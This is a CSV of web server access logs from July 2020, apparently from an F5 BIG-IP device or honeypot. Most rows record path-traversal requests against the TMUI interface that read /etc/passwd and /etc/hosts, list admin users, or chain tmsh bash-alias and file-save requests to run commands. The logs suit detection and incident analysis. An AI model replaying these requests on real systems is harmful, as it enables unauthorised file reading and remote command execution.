Timestamp,Remote IP,HTTP Method,URL,User-Agent,Response Code
"Jul 7, 2020 @ 02:20:31.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:16:49.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:16:47.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:16:46.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:16:43.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:16:04.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:16:03.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:16:02.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:16:01.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:14:43.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:14:42.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:14:42.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:14:42.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:14:42.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:14:41.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:14:40.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:14:39.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:13:38.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:13:37.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:13:35.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:13:34.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:13:19.000",174.194.22.146,GET,/tmui/login.jsp,curl/7.54.0,200
"Jul 7, 2020 @ 02:13:18.000",174.194.22.146,GET,/tmui/login.jsp,curl/7.54.0,200
"Jul 7, 2020 @ 02:13:17.000",174.194.22.146,GET,/tmui/login.jsp,curl/7.54.0,200
"Jul 7, 2020 @ 02:11:26.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:11:24.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:11:23.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:11:21.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:11:09.000",103.140.186.29,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user,Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;) http://help.yahoo.com/help/us/ysearch/slurp),200
"Jul 7, 2020 @ 02:10:59.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:10:58.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:10:57.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:10:56.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:10:07.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:10:07.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:10:06.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:10:06.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:10:06.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:10:06.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:10:05.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:10:05.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:09:31.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:09:30.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:09:28.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:09:26.000",174.100.226.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:09:21.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:09:21.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:09:20.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:09:20.000",108.61.217.254,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.18.4,200
"Jul 7, 2020 @ 02:08:53.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 02:08:35.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 02:05:51.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:05:49.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:05:48.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:05:46.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:05:00.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 02:04:12.000",44.224.22.196,GET,/latest/dynamic/instance-identity/document,AWS Security Scanner,404
"Jul 7, 2020 @ 02:04:11.000",44.224.22.196,GET,/latest/dynamic/instance-identity/document,AWS Security Scanner,404
"Jul 7, 2020 @ 02:04:10.000",44.224.22.196,GET,/,AWS Security Scanner,200
"Jul 7, 2020 @ 02:04:10.000",44.224.22.196,GET,/,AWS Security Scanner,200
"Jul 7, 2020 @ 02:04:09.000",44.224.22.196,GET,/,AWS Security Scanner,200
"Jul 7, 2020 @ 02:04:06.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:06.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:06.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:05.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:05.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:05.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:04.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:04.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:04.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:04:03.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:03:32.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:03:31.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:03:30.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:03:28.000",157.49.173.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:00:40.000",44.224.22.196,GET,/,AWS Security Scanner,200
"Jul 7, 2020 @ 02:00:40.000",44.224.22.196,GET,/latest/dynamic/instance-identity/document,AWS Security Scanner,404
"Jul 7, 2020 @ 02:00:40.000",44.224.22.196,GET,/latest/dynamic/instance-identity/document,AWS Security Scanner,404
"Jul 7, 2020 @ 02:00:39.000",44.224.22.196,GET,/,AWS Security Scanner,200
"Jul 7, 2020 @ 02:00:39.000",44.224.22.196,GET,/,AWS Security Scanner,200
"Jul 7, 2020 @ 02:00:38.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:38.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:38.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:38.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:38.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:38.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:38.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:38.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:37.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 02:00:37.000",44.224.22.196,GET,/,-,400
"Jul 7, 2020 @ 01:56:09.000",182.160.114.20,GET,/admin//config.php,curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/1.0.1e zlib/1.2.3 libidn/0.6.5,404
"Jul 7, 2020 @ 01:54:53.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 01:52:12.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 01:52:06.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 01:49:24.000",216.218.206.69,GET,/,-,200
"Jul 7, 2020 @ 01:49:21.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 01:49:05.000",103.140.186.29,GET,/xui/common/css/reset.css,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:05.000",103.140.186.29,GET,/xui/common/css/fonts.css,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:04.000",103.140.186.29,GET,/xui/common/css/modals.css,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:03.000",103.140.186.29,GET,/xui/common/css/fonts.css,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:03.000",103.140.186.29,GET,/tmui/tmui/login/images/background_banner.png,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:03.000",103.140.186.29,GET,/,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:03.000",103.140.186.29,GET,/xui/common/blank.html,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:02.000",103.140.186.29,GET,/xui/common/css/reset.css,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:02.000",103.140.186.29,GET,/tmui/tmui/login/images/logo_f5.png,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:01.000",103.140.186.29,GET,/tmui/login.jsp,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:01.000",103.140.186.29,GET,/tmui/tmui/login/css/login.css?,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:01.000",103.140.186.29,GET,/xui/common/scripts/utility.js?,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:49:00.000",103.140.186.29,GET,/tmui/tmui/system/settings/redirect.jsp,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",302
"Jul 7, 2020 @ 01:48:59.000",103.140.186.29,GET,/,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:47:42.000",216.218.206.69,GET,/,-,200
"Jul 7, 2020 @ 01:47:07.000",144.202.58.117,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:47:07.000",144.202.58.117,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:46:54.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 01:46:28.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:46:27.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:46:19.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:46:18.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:46:02.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:46:01.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:45:11.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:45:10.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:44:54.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:44:53.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 01:44:08.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 01:42:24.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:42:23.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:42:22.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&content=id,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:42:20.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:42:18.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:42:01.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:41:59.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:41:58.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&content=id,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:41:55.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:41:53.000",103.140.186.29,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 01:39:08.000",207.148.122.136,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,python-requests/2.21.0,200
"Jul 7, 2020 @ 01:39:06.000",207.148.122.136,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.21.0,200
"Jul 7, 2020 @ 01:39:03.000",207.148.122.136,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,python-requests/2.21.0,200
"Jul 7, 2020 @ 01:37:56.000",209.17.96.218,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 01:36:59.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:58.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:56.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:55.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:53.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:51.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:49.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:48.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:46.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:44.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:42.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:41.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
"Jul 7, 2020 @ 01:36:39.000",139.162.37.19,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Go-http-client/1.1,200
